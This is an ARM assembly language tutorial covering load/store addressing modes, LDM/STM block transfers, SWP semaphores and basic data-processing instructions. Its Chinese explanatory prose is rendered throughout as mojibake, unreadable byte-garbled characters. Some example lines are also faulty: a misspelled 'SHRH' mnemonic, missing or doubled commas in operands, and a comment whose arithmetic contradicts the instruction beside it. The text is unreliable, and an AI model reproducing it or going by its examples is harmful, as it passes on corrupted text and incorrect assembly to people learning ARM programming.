â€‹ (1) ç«‹å³æ•°ã€‚ç«‹å³æ•°å¯ä»¥æ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•°å€¼ï¼Œè¿™ä¸ªæ•°æ®å¯ä»¥åŠ åˆ°åŸºå€å¯„å­˜å™¨ï¼Œä¹Ÿå¯ä»¥ä»åŸºå€å¯„å­˜å™¨ä¸­å‡å»è¿™ä¸ªæ•°å€¼ã€‚æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ LDR R1,[R0,#0x12] ;å°†R0+0x12 åœ°å€å¤„çš„æ•°æ®è¯»å‡ºï¼Œä¿å­˜åˆ°R1ä¸­(R0 çš„å€¼ä¸å˜) â€‹ LDR R1,[R0,#-0x12];å°†R0-0x12 åœ°å€å¤„çš„æ•°æ®è¯»å‡ºï¼Œä¿å­˜åˆ°R1ä¸­(R0 çš„å€¼ä¸å˜) â€‹ LDR R1,[R0] ;å°†R0 åœ°å€å¤„çš„æ•°æ®è¯»å‡ºï¼Œä¿å­˜åˆ°R1 ä¸­(é›¶åç§») â€‹ (2)å¯„å­˜å™¨ã€‚å¯„å­˜å™¨ä¸­çš„æ•°å€¼å¯ä»¥åŠ åˆ°åŸºå€å¯„å­˜å™¨ï¼Œä¹Ÿå¯ä»¥ä»åŸºå€å¯„å­˜å™¨ä¸­å‡å»è¿™ä¸ªæ•°å€¼ã€‚æŒ‡ä»¤ä¸¾ä¾‹å€¼ã€‚æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ LDR R1,[R0,R2] ;å°†R0+R2 åœ°å€çš„æ•°æ®è®¡è¯»å‡ºï¼Œä¿å­˜åˆ°R1ä¸­(R0 çš„å€¼ä¸å˜) â€‹ LDR R1,[R0,-R2] ;å°†R0-R2 åœ°å€å¤„çš„æ•°æ®è®¡è¯»å‡ºï¼Œä¿å­˜åˆ°R1ä¸­(R0 çš„å€¼ä¸å˜) â€‹ (3)å¯„å­˜å™¨åŠç§»ä½å¸¸æ•°ã€‚å¯„å­˜å™¨ç§»ä½åçš„å€¼å¯ä»¥åŠ åˆ°åŸºå€å¯„å­˜å™¨ï¼Œä¹Ÿå¯ä»¥ä»åŸºå€å¯„å­˜å™¨ä¸­å‡å»è¿™ä¸ªæ•°å€¼ã€‚æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ LDR R1,[R0,R2,LSL #2] ;å°†R0+R24åœ°å€å¤„çš„æ•°æ®è¯»å‡ºï¼Œä¿å­˜åˆ°R1ä¸­ï¼ˆR0ï¼ŒR2çš„å€¼ä¸å˜ï¼‰ â€‹ LDR R1,[R0,-R2,LSL #2];å°†R0-R24åœ°å€å¤„çš„æ•°æ®è®¡è¯»å‡ºï¼Œä¿å­˜åˆ°R1ä¸­(R0ï¼ŒR2çš„å€¼ä¸å˜) â€‹ ä»å¯»å€æ–¹å¼çš„åœ°å€è®¡ç®—æ–¹æ³•åˆ†ï¼ŒåŠ è½½/å­˜å‚¨æŒ‡ä»¤æœ‰ä»¥ä¸‹4 ç§å½¢å¼ï¼š â€‹ (1)é›¶åç§»ã€‚Rn çš„å€¼ä½œä¸ºä¼ é€æ•°æ®çš„åœ°å€ï¼Œå³åœ°å€åç§»é‡ä¸º0ã€‚æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ LDR Rd,[Rn] â€‹ (2)å‰ç´¢å¼•åç§»ã€‚åœ¨æ•°æ®ä¼ é€ä¹‹å‰ï¼Œå°†åç§»é‡åŠ åˆ°Rn ä¸­ï¼Œå…¶ç»“æœä½œä¸ºä¼ é€æ•°æ®çš„å­˜å‚¨åœ°å€ã€‚è‹¥ä½¿ç”¨åç¼€â€œï¼â€ï¼Œåˆ™ç»“æœå†™å›åˆ°Rnä¸­ï¼Œä¸”Rn å€¼ä¸å…è®¸ä¸ºR15ã€‚æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ LDR Rd,[Rn,#0x04]! â€‹ LDR Rd,[Rn,#-0x04] â€‹ (3)ç¨‹åºç›¸å¯¹åç§»ã€‚ç¨‹åºç›¸å¯¹åç§»æ˜¯ç´¢å¼•å½¢å¼çš„å¦ä¸€ä¸ªç‰ˆæœ¬ã€‚æ±‡ç¼–å™¨ç”±PC å¯„å­˜å™¨è®¡ç®—åç§»é‡ï¼Œå¹¶å°†PCå¯„å­˜å™¨ä½œä¸ºRn ç”Ÿæˆå‰ç´¢å¼•æŒ‡ä»¤ã€‚ä¸èƒ½ä½¿ç”¨åç¼€â€œï¼â€ã€‚æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ LDR Rd,label ;label ä¸ºç¨‹åºæ ‡å·ï¼Œlabel å¿…é¡»æ˜¯åœ¨å½“å‰æŒ‡ä»¤çš„Â±4KBèŒƒå›´å†… â€‹ (4) åç´¢å¼•åç§»ã€‚Rn çš„å€¼ç”¨åšä¼ é€æ•°æ®çš„å­˜å‚¨åœ°å€ã€‚åœ¨æ•°æ®ä¼ é€åï¼Œå°†åç§»é‡ä¸Rnç›¸åŠ ï¼Œç»“æœå†™å›åˆ°Rnä¸­ã€‚Rn ä¸å…è®¸æ˜¯R15ã€‚æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ LDR Rd,[Rn],#0x04 â€‹ åœ°å€å¯¹å‡†--å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¿…é¡»ä¿è¯ç”¨äº32 ä½ä¼ é€çš„åœ°å€æ˜¯32 ä½å¯¹å‡†çš„ã€‚ â€‹ åŠ è½½/å­˜å‚¨å­—å’Œæ— ç¬¦å·å­—èŠ‚æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ LDR R2,[R5] ;åŠ è½½R5 æŒ‡å®šåœ°å€ä¸Šçš„æ•°æ®(å­—)ï¼Œæ”¾å…¥R2 ä¸­ â€‹ STR R1,[R0,#0x04] ;å°†R1 çš„æ•°æ®å­˜å‚¨åˆ°R0+0x04å­˜å‚¨å•å…ƒï¼ŒR0 å€¼ä¸å˜ â€‹ LDRB R3,[R2],#1 ;è¯»å–R2 åœ°å€ä¸Šçš„ä¸€å­—èŠ‚æ•°æ®ï¼Œå¹¶ä¿å­˜åˆ°R3ä¸­ï¼ŒR2=R3+1 â€‹ STRB R6,[R7] ;è¯»R6 çš„æ•°æ®ä¿å­˜åˆ°R7 æŒ‡å®šçš„åœ°å€ä¸­ï¼Œåªå­˜å‚¨ä¸€å­—èŠ‚æ•°æ® â€‹ åŠ è½½/å­˜å‚¨åŠå­—å’Œå¸¦ç¬¦å·å­—èŠ‚ã€‚è¿™ç±»LDR/STR æŒ‡ä»¤å¯èƒ½åŠ è½½å¸¦ç¬¦å­—èŠ‚\\åŠ è½½å¸¦ç¬¦å·åŠå­—ã€åŠ è½½/å­˜å‚¨æ— ç¬¦å·åŠå­—ã€‚åç§»é‡æ ¼å¼ã€å¯»å€æ–¹å¼ä¸åŠ è½½/å­˜å‚¨å­—å’Œæ— ç¬¦å·å­—èŠ‚æŒ‡ä»¤ç›¸åŒã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ LDR{cond}SB Rd,\u003cåœ°å€\u003e ;åŠ è½½æŒ‡å®šåœ°å€ä¸Šçš„æ•°æ®(å¸¦ç¬¦å·å­—èŠ‚)ï¼Œæ”¾å…¥Rdä¸­ â€‹ LDR{cond}SH Rd,\u003cåœ°å€\u003e ;åŠ è½½æŒ‡å®šåœ°å€ä¸Šçš„æ•°æ®(å¸¦ç¬¦å·å­—èŠ‚)ï¼Œæ”¾å…¥Rdä¸­ â€‹ LDR{cond}H Rd,\u003cåœ°å€\u003e ;åŠ è½½åŠå­—æ•°æ®ï¼Œæ”¾å…¥Rdä¸­ï¼Œå³Rdæœ€ä½16ä½æœ‰æ•ˆ,é«˜16ä½æ¸…é›¶ â€‹ STR{cond}H Rd,\u003cåœ°å€\u003e ;å­˜å‚¨åŠå­—æ•°æ®ï¼Œè¦å­˜å‚¨çš„æ•°æ®åœ¨Rdï¼Œæœ€ä½16ä½æœ‰æ•ˆ â€‹ è¯´æ˜ï¼šå¸¦ç¬¦å·ä½åŠå­—/å­—èŠ‚åŠ è½½æ˜¯æŒ‡å¸¦ç¬¦å·ä½åŠ è½½æ‰©å±•åˆ°32 ä½;æ— ç¬¦å·ä½åŠå­—åŠ è½½æ˜¯æŒ‡é›¶æ‰©å±•åˆ°32ä½ã€‚ â€‹ åœ°å€å¯¹å‡†--å¯¹åŠå­—ä¼ é€çš„åœ°å€å¿…é¡»ä¸ºå¶æ•°ã€‚éåŠå­—å¯¹å‡†çš„åŠå­—åŠ è½½å°†ä½¿Rd å†…å®¹ä¸å¯é ï¼ŒéåŠå­—å¯¹å‡†çš„åŠå­—å­˜å‚¨å°†ä½¿æŒ‡å®šåœ°å€çš„2å­—èŠ‚å­˜å‚¨å†…å®¹ä¸å¯é ã€‚\nâ€‹ åŠ è½½/å­˜å‚¨åŠå­—å’Œå¸¦ç¬¦å·å­—èŠ‚æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š\nâ€‹  LDRSB R1[R0,R3] ;å°†R0+R3åœ°å€ä¸Šçš„å­—èŠ‚æ•°æ®è¯»å‡ºåˆ°R1ï¼Œé«˜24 ä½ç”¨ç¬¦å·ä½æ‰©å±• â€‹ LDRSH R1,[R9] ;å°†R9 åœ°å€ä¸Šçš„åŠå­—æ•°æ®è¯»å‡ºåˆ°R1ï¼Œé«˜16ä½ç”¨ç¬¦å·ä½æ‰©å±• â€‹ LDRH R6,[R2],#2 ;å°†R2 åœ°å€ä¸Šçš„åŠå­—æ•°æ®è¯»å‡ºåˆ°R6ï¼Œé«˜16ä½ç”¨é›¶æ‰©å±•ï¼ŒR2=R2+1 â€‹  SHRH R1,[R0,#2]!;å°†R1 çš„æ•°æ®ä¿å­˜åˆ°R2+2 åœ°å€ä¸­ï¼Œåªå­˜å‚¨ä½2å­—èŠ‚æ•°æ®ï¼ŒR0=R0+2 â€‹ LDR/STR æŒ‡ä»¤ç”¨äºå¯¹å†…å­˜å˜é‡çš„è®¿é—®ï¼Œå†…å­˜ç¼“å†²åŒºæ•°æ®çš„è®¿é—®ã€æŸ¥è¡¨ã€å¤–è®¾çš„æ§åˆ¶æ“ä½œç­‰ç­‰ï¼Œè‹¥ä½¿ç”¨LDR æŒ‡ä»¤åŠ è½½æ•°æ®åˆ°PC å¯„å­˜å™¨ï¼Œåˆ™å®ç°ç¨‹åºè·³è½¬åŠŸèƒ½ï¼Œè¿™æ ·ä¹Ÿå°±å®ç°äº†ç¨‹åºæ•£è½¬ã€‚ â€‹ å˜é‡çš„è®¿é—® â€‹ NumCount EQU 0x40003000 ;å®šä¹‰å˜é‡NumCount â€‹ â€¦ â€‹ LDR R0,=NumCount ;ä½¿ç”¨LDR ä¼ªæŒ‡ä»¤è£…è½½NumCountçš„åœ°å€åˆ°R0 â€‹ LDR R1,[R0] ;å–å‡ºå˜é‡å€¼ â€‹ ADD R1,R1,#1 ;NumCount=NumCount+1 â€‹ STR R1,[R0] ;ä¿å­˜å˜é‡å€¼ â€‹ â€¦ â€‹ GPIO è®¾ç½® â€‹ GPIO-BASE EQU 0Xe0028000 ;å®šä¹‰GPIO å¯„å­˜å™¨çš„åŸºåœ°å€ â€‹ â€¦ â€‹ LDR R0,=GPIO-BASE â€‹ LDR R1,=0x00FFFF00 ;è£…è½½32 ä½ç«‹å³æ•°ï¼Œå³è®¾ç½®å€¼ â€‹ STR R1,[R0,#0x0C] ;IODIR=0x00FFFF00ï¼Œ IODIR çš„åœ°å€ä¸º0xE002800C â€‹ MOV R1,#0x00F00000 â€‹ STR R1,[R0,#0x04] ;IOSET=0x00F00000ï¼ŒIOSET çš„åœ°å€ä¸º0xE0028004 â€‹ â€¦ â€‹ ç¨‹åºæ•£è½¬ â€‹ â€¦ â€‹ MOV R2,R2,LSL #2 ;åŠŸèƒ½å·ä¹˜ä¸Š4ï¼Œä»¥ä¾¿æŸ¥è¡¨ â€‹ LDR PC,[PC,R2] ;æŸ¥è¡¨å–å¾—å¯¹åº”åŠŸèƒ½å­ç¨‹åºåœ°å€ï¼Œå¹¶è·³è½¬ â€‹ NOP â€‹ FUN-TAB DCD FUN-SUB0 â€‹ DCD FUN-SUB1 â€‹ DCD FUN-SUB2 â€‹ â€¦\nLDMå’ŒSTM â€‹ æ‰¹é‡åŠ è½½/å­˜å‚¨æŒ‡ä»¤å¯ä»¥å®ç°åœ¨ä¸€ç»„å¯„å­˜å™¨å’Œä¸€å—è¿ç»­çš„å†…å­˜å•å…ƒä¹‹é—´ä¼ è¾“æ•°æ®ã€‚LDMä¸ºåŠ è½½å¤šä¸ªå¯„å­˜å™¨ï¼ŒSTM ä¸ºå­˜å‚¨å¤šä¸ªå¯„å­˜å™¨ã€‚å…è®¸ä¸€æ¡æŒ‡ä»¤ä¼ é€16 ä¸ªå¯„å­˜å™¨çš„ä»»ä½•å­é›†æˆ–æ‰€æœ‰å¯„å­˜å™¨ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ LDM{cond}\u003cæ¨¡å¼\u003e Rn{!},reglist{^} â€‹ STM{cond}\u003cæ¨¡å¼\u003e Rn{!},reglist{^} â€‹ LDM /STM çš„ä¸»è¦ç”¨é€”æ˜¯ç°åœºä¿æŠ¤ã€æ•°æ®å¤åˆ¶ã€å‚æ•°ä¼ é€ç­‰ã€‚å…¶æ¨¡å¼æœ‰8ç§ï¼Œå¦‚ä¸‹æ‰€åˆ—ï¼š(å‰é¢4 ç§ç”¨äºæ•°æ®å—çš„ä¼ è¾“ï¼Œåé¢4 ç§æ˜¯å †æ ˆæ“ä½œ)ã€‚ â€‹ (1) IAï¼šæ¯æ¬¡ä¼ é€ååœ°å€åŠ 4 â€‹ (2) IBï¼šæ¯æ¬¡ä¼ é€å‰åœ°å€åŠ 4 â€‹ (3) DAï¼šæ¯æ¬¡ä¼ é€ååœ°å€å‡4 â€‹ (4) DBï¼šæ¯æ¬¡ä¼ é€å‰åœ°å€å‡4 â€‹ (5) FDï¼šæ»¡é€’å‡å †æ ˆ â€‹ (6) EDï¼šç©ºé€’å¢å †æ ˆ â€‹ (7) FAï¼šæ»¡é€’å¢å †æ ˆ â€‹ (8) EAï¼šç©ºé€’å¢å †æ ˆ â€‹ å…¶ä¸­ï¼Œå¯„å­˜å™¨Rn ä¸ºåŸºå€å¯„å­˜å™¨ï¼Œè£…æœ‰ä¼ é€æ•°æ®çš„åˆå§‹åœ°å€ï¼ŒRn ä¸å…è®¸ä¸ºR15;åç¼€â€œï¼â€è¡¨ç¤ºæœ€åçš„åœ°å€å†™å›åˆ°Rnä¸­;å¯„å­˜å™¨åˆ—è¡¨reglist å¯åŒ…å«å¤šäºä¸€ä¸ªå¯„å­˜å™¨æˆ–å¯„å­˜å™¨èŒƒå›´ï¼Œä½¿ç”¨â€œ,â€åˆ†å¼€ï¼Œå¦‚{R1,R2,R6-R9},å¯„å­˜å™¨æ’åˆ—ç”±å°åˆ°å¤§æ’åˆ—ï¼›â€œï¼¾â€åç¼€ä¸å…è®¸åœ¨ç”¨æˆ·æ¨¡å¼å‘ˆç³»ç»Ÿæ¨¡å¼ä¸‹ä½¿ç”¨ï¼Œè‹¥åœ¨LDM æŒ‡ä»¤ç”¨å¯„å­˜å™¨åˆ—è¡¨ä¸­åŒ…å«æœ‰PC æ—¶ä½¿ç”¨ï¼Œé‚£ä¹ˆé™¤äº†æ­£å¸¸çš„å¤šå¯„å­˜å™¨ä¼ é€å¤–ï¼Œå°†SPSR æ‹·è´åˆ°CPSR ä¸­ï¼Œè¿™å¯ç”¨äºå¼‚å¸¸å¤„ç†è¿”å›ï¼›ä½¿ç”¨â€œï¼¾â€åç¼€è¿›è¡Œæ•°æ®ä¼ é€ä¸”å¯„å­˜å™¨åˆ—è¡¨ä¸åŒ…å«PCæ—¶ï¼ŒåŠ è½½/å­˜å‚¨çš„æ˜¯ç”¨æˆ·æ¨¡å¼çš„å¯„å­˜å™¨ï¼Œè€Œä¸æ˜¯å½“å‰æ¨¡å¼çš„å¯„å­˜å™¨ã€‚ â€‹ åœ°å€å¯¹å‡†â€•â€•è¿™äº›æŒ‡ä»¤å¿½ç•¥åœ°å€çš„ä½[1ï¼š0]ã€‚ â€‹ æ‰¹é‡åŠ è½½/å­˜å‚¨æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ LDMIA R0!,{R3-R9} ;åŠ è½½R0 æŒ‡å‘çš„åœ°å€ä¸Šçš„å¤šå­—æ•°æ®ï¼Œä¿å­˜åˆ°R3ï½R9ä¸­ï¼ŒR0 å€¼æ›´æ–° â€‹ STMIA R1!,{R3-R9} ;å°†R3ï½R9 çš„æ•°æ®å­˜å‚¨åˆ°R1 æŒ‡å‘çš„åœ°å€ä¸Šï¼ŒR1å€¼æ›´æ–° â€‹ STMFD SP!,{R0-R7,LR} ;ç°åœºä¿å­˜ï¼Œå°†R0ï½R7ã€LRå…¥æ ˆ â€‹ LDMFD SP!,{R0-R7,PC}^;æ¢å¤ç°åœºï¼Œå¼‚å¸¸å¤„ç†è¿”å› â€‹ åœ¨è¿›è¡Œæ•°æ®å¤åˆ¶æ—¶ï¼Œå…ˆè®¾ç½®å¥½æºæ•°æ®æŒ‡é’ˆï¼Œç„¶åä½¿ç”¨å—æ‹·è´å¯»å€æŒ‡ä»¤LDMIA/STMIAã€LDMIB/STMIBã€LDMDA/STMDAã€LDMDB/STMDB è¿›è¡Œè¯»å–å’Œå­˜å‚¨ã€‚è€Œè¿›è¡Œå †æ ˆæ“ä½œæ—¶ï¼Œåˆ™è¦å…ˆè®¾ç½®å †æ ˆæŒ‡é’ˆï¼Œä¸€èˆ¬ä½¿ç”¨SP ç„¶åä½¿ç”¨å †æ ˆå¯»å€æŒ‡ä»¤STMFD/LDMFDã€STMEDã€‚LDMEDã€STMFA/LDMFAã€STMEA/LDMEAå®ç°å †æ ˆæ“ä½œã€‚ â€‹ å¤šå¯„å­˜å™¨ä¼ é€æŒ‡ä»¤ç¤ºæ„å›¾å¦‚å›¾A-1æ‰€ç¤ºï¼Œå…¶ä¸­R1ä¸ºæŒ‡ä»¤æ‰§è¡Œå‰çš„åŸºå€å¯„å­˜å™¨ï¼ŒR1â€™åˆ™ä¸ºæŒ‡ä»¤æ‰§è¡Œå®Œåçš„åŸºå€å¯„å­˜å™¨ã€‚\nï¼ˆaï¼‰æŒ‡ä»¤STMIA R1!,{R5-R7} ï¼ˆbï¼‰æŒ‡ä»¤STMIB R1!,{R5-R7}\nï¼ˆcï¼‰æŒ‡ä»¤STMDA R1!, {R5-R7} ï¼ˆdï¼‰æŒ‡ä»¤STMDB R1!,{R5-R7} å›¾A-1 å¤šå¯„å­˜å™¨ä¼ é€æŒ‡ä»¤ç¤ºæ„å›¾\nâ€‹ æ•°æ®æ˜¯å­˜å‚¨åœ¨åŸºå€å¯„å­˜å™¨çš„åœ°å€ä¹‹ä¸Šè¿˜æ˜¯ä¹‹ä¸‹ï¼Œåœ°å€æ˜¯åœ¨å­˜å‚¨ç¬¬ä¸€ä¸ªå€¼ä¹‹å‰è¿˜æ˜¯ä¹‹åå¢åŠ è¿˜æ˜¯å‡å°‘ã€‚è¡¨A-3ç»™å‡ºå¤šå¯„å­˜å™¨ä¼ é€æŒ‡ä»¤æ˜ å°„ç¤ºæ„è¡¨ã€‚\nè¡¨A-3 å¤šå¯„å­˜å™¨ä¼ é€æŒ‡ä»¤æ˜ å°„ç¤ºæ„è¡¨\nä½¿ç”¨LDM/STM è¿›è¡Œæ•°æ®å¤åˆ¶ä¾‹ç¨‹å¦‚ä¸‹ï¼š â€¦ LDR R0,=SrcData ;//è®¾ç½®æºæ•°æ®åœ°å€ LDR R1,=DstData ;//è®¾ç½®ç›®æ ‡åœ°å€ LDMIA R0,{R2-R9} ;//åŠ è½½8 å­—æ•°æ®åˆ°å¯„å­˜å™¨R2ï½R9 STMIA R1,{R2-R9} ;//å­˜å‚¨å¯„å­˜å™¨R2ï½R9 åˆ°ç›®æ ‡åœ°å€ â€‹ ä½¿ç”¨LDM/STM è¿›è¡Œç°åœºå¯„å­˜å™¨ä¿æŠ¤ï¼Œå¸¸åœ¨å­ç¨‹åºä¸­æˆ–å¼‚å¸¸å¤„ç†ä½¿ç”¨ï¼š â€‹ SENDBYTE â€‹ STMFD SP!,{R0-R7,LR} ;å¯„å­˜å™¨å…¥å † â€‹ â€¦ â€‹ BL DELAY ;è°ƒç”¨DELAY å­ç¨‹åº â€‹ â€¦ â€‹ LDMFD SP!,{R0-R7,PC} ;æ¢å¤å¯„å­˜å™¨ï¼Œå¹¶è¿”å›\nSWP â€‹ å¯„å­˜å™¨å’Œå­˜å‚¨å™¨äº¤æ¢æŒ‡ä»¤ã€‚SWPæŒ‡ä»¤ç”¨äºå°†ä¸€ä¸ªå†…å­˜å•å…ƒï¼ˆè¯¥å•å…ƒåœ°å€æ”¾åœ¨å¯„å­˜å™¨Rnä¸­ï¼‰çš„å†…å®¹è¯»å–åˆ°ä¸€ä¸ªå¯„å­˜å™¨Rdä¸­ï¼ŒåŒæ—¶å°†å¦ä¸€ä¸ªå¯„å­˜å™¨Rm çš„å†…å®¹å†™å…¥åˆ°è¯¥å†…å­˜å•å…ƒä¸­ã€‚ä½¿ç”¨SWP å¯å®ç°ä¿¡å·é‡æ“ä½œã€‚ â€‹ æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹  SWP{cond}{B} Rd,Rm,[Rn] â€‹ å…¶ä¸­ï¼ŒB ä¸ºå¯é€‰åç¼€ï¼Œè‹¥æœ‰Bï¼Œåˆ™äº¤æ¢å­—èŠ‚ï¼Œå¦åˆ™äº¤æ¢32 ä½å­—ï¼šRd ä¸ºæ•°æ®ä»å­˜å‚¨å™¨åŠ è½½åˆ°çš„å¯„å­˜å™¨;Rmçš„æ•°æ®ç”¨äºå­˜å‚¨åˆ°å­˜å‚¨å™¨ä¸­ï¼Œè‹¥Rm ä¸Rn ç›¸åŒï¼Œåˆ™ä¸ºå¯„å­˜å™¨ä¸å­˜å‚¨å™¨å†…å®¹è¿›è¡Œäº¤æ¢;Rn ä¸ºè¦è¿›è¡Œæ•°æ®äº¤æ¢çš„å­˜å‚¨å™¨åœ°å€ï¼ŒRn ä¸èƒ½ä¸Rd å’ŒRm ç›¸åŒã€‚ â€‹ SWP æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ SWP R1,R1,[R0] ; å°†R1 çš„å†…å®¹ä¸R0 æŒ‡å‘çš„å­˜å‚¨å•å…ƒçš„å†…å®¹è¿›è¡Œäº¤æ¢ â€‹ SWP R1,R2,,[R0] ; å°†R0 æŒ‡å‘çš„å­˜å‚¨å•å…ƒå†…å®¹è¯»å–ä¸€å­—èŠ‚æ•°æ®åˆ°R1ä¸­(é«˜24 ä½æ¸…é›¶) â€‹ ; å¹¶å°†R2 çš„å†…å®¹å†™å…¥åˆ°è¯¥å†…å­˜å•å…ƒä¸­(æœ€ä½å­—èŠ‚æœ‰æ•ˆ) â€‹ ä½¿ç”¨SWP æŒ‡ä»¤å¯ä»¥æ–¹ä¾¿åœ°è¿›è¡Œä¿¡å·é‡çš„æ“ä½œï¼š â€‹ 12C_SEM EQU 0x40003000 â€‹ â€¦ â€‹ 12C_SEM_WAIT â€‹ MOV R0,#0 â€‹ LDR R0,=12C_SEM â€‹ SWP R1,R1,[R0] ;å–å‡ºä¿¡å·é‡ï¼Œå¹¶è®¾ç½®å…¶ä¸º0 â€‹ CMP R1,#0 ;åˆ¤æ–­æ˜¯å¦æœ‰ä¿¡å· â€‹ BEQ 12C_SEM_WAIT ;è‹¥æ²¡æœ‰ä¿¡å·ï¼Œåˆ™ç­‰å¾…\n1.3.2. ARM æ•°æ®å¤„ç†æŒ‡ä»¤ â€‹ æ•°æ®å¤„ç†æŒ‡ä»¤å¤§è‡´å¯åˆ†ä¸º3 ç±»ï¼š\nï¼ˆ1ï¼‰ æ•°æ®ä¼ é€æŒ‡ä»¤ï¼ˆå¦‚MOVã€MVNï¼‰\nï¼ˆ2ï¼‰ ç®—æœ¯é€»è¾‘è¿ç®—æŒ‡ä»¤ï¼ˆå¦‚ADD,SUM,ANDï¼‰\nï¼ˆ3ï¼‰ æ¯”è¾ƒæŒ‡ä»¤ï¼ˆå¦‚CMPã€TSTï¼‰ã€‚\næ•°æ®å¤„ç†æŒ‡ä»¤åªèƒ½å¯¹å¯„å­˜å™¨çš„å†…å®¹è¿›è¡Œæ“ä½œã€‚ æ‰€æœ‰ARM æ•°æ®å¤„ç†æŒ‡ä»¤å‡å¯é€‰æ‹©ä½¿ç”¨S åç¼€ï¼Œä»¥å½±å“çŠ¶æ€æ ‡å¿—ã€‚æ¯”è¾ƒæŒ‡ä»¤CMPã€CMNã€TSTå’ŒTEQä¸éœ€è¦åç¼€Sï¼Œå®ƒä»¬ä¼šç›´æ¥å½±å“çŠ¶æ€æ ‡å¿—ã€‚ARMæ•°æ®å¤„ç†æŒ‡ä»¤åˆ—äºè¡¨A-4ä¸­ã€‚\nè¡¨A-4 ARM æ•°æ®å¤„ç†æŒ‡ä»¤\nï¼ˆ1ï¼‰æ•°æ®ä¼ é€æŒ‡ä»¤ **MOV** æ•°æ®ä¼ é€æŒ‡ä»¤ã€‚å°†8 ä½å›¾ç«‹å³æ•°æˆ–å¯„å­˜å™¨(operant2)ä¼ é€åˆ°ç›®æ ‡å¯„å­˜å™¨Rdï¼Œå¯ç”¨äºç§»ä½è¿ç®—ç­‰æ“ä½œã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š MOV{cond}{S} Rd,operand2 MOV æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š MOV R1#0x10 ;R1=0x10 MOV R0,R1 ;R0=R1 MOVS R3,R1,LSL #2 ;R3=R1ï¼œï¼œ2ï¼Œå¹¶å½±å“æ ‡å¿—ä½ MOV PC,LR ;PC=LR ï¼Œå­ç¨‹åºè¿”å› MVN â€‹ æ•°æ®éä¼ é€æŒ‡ä»¤ã€‚å°†8 ä½å›¾ç«‹å³æ•°æˆ–å¯„å­˜å™¨(operand2)æŒ‰ä½å–ååä¼ é€åˆ°ç›®æ ‡å¯„å­˜å™¨(Rd)ï¼Œå› ä¸ºå…¶å…·æœ‰å–ååŠŸèƒ½ï¼Œæ‰€ä»¥å¯ä»¥è£…è½½èŒƒå›´æ›´å¹¿çš„ç«‹å³æ•°ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ MVN{cond}{S} Rd,operand2 â€‹ MVN æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ MVN R1,#0xFF ;R1=0xFFFFFF00 â€‹ MVN R1,R2 ;å°†R2 å–åï¼Œç»“æœå­˜åˆ°R1\nâ€‹ ï¼ˆ2ï¼‰ç®—æœ¯é€»è¾‘è¿ç®—æŒ‡ä»¤\nADD â€‹ åŠ æ³•è¿ç®—æŒ‡ä»¤ã€‚å°†operand2 æ•°æ®ä¸Rn çš„å€¼ç›¸åŠ ï¼Œç»“æœä¿å­˜åˆ°Rd å¯„å­˜å™¨ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ ADD{cond}{S} Rd,Rn,operand2 â€‹ ADD æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ ADDS R1,R1,#1 ;R1=R1+1 â€‹ ADD R1,R1,R2 ;R1=R1+R2 â€‹ ADDS R3,R1,R2,LSL #2 ;R3=R1+R2ï¼œï¼œ2\nSUB â€‹ å‡æ³•è¿ç®—æŒ‡ä»¤ã€‚ç”¨å¯„å­˜å™¨Rn å‡å»operand2ã€‚ç»“æœä¿å­˜åˆ°Rd ä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ SUB{cond}{S} Rd,Rn,operand2 â€‹ SUB æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ SUBS R0,R0,#1 ;R0=R0-1 â€‹ SUBS R2,R1,R2 ;R2=R1-R2 â€‹ SUB R6,R7,#0x10 ;R6=R7-0x10\nRSB â€‹ é€†å‘å‡æ³•æŒ‡ä»¤ã€‚ç”¨å¯„å­˜å™¨operand2 å‡æ³•Rnï¼Œç»“æœä¿å­˜åˆ°Rd ä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ RSB{cond}{S} Rd,Rn,operand2 â€‹ SUB æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ RSB R3,R1,#0xFF00 ;R3=0xFF00-R1 â€‹ RSBS R1,R2,R2,LSL #2 ;R1=R2ï¼œï¼œ2-R2=R2Ã—3 â€‹ RSB R0,R1,#0 ;R0=-R1\nADC â€‹ å¸¦è¿›ä½åŠ æ³•æŒ‡ä»¤ã€‚å°†operand2 çš„æ•°æ®ä¸Rn çš„å€¼ç›¸åŠ ï¼Œå†åŠ ä¸ŠCPSRä¸­çš„C æ¡ä»¶æ ‡å¿—ä½ã€‚ç»“æœä¿å­˜åˆ°Rd å¯„å­˜å™¨ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ ADC{cond}{S} Rd,Rn,operand2 â€‹ ADC æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ ADDS R0,R0,R2 â€‹ ADC R1,R1,R3 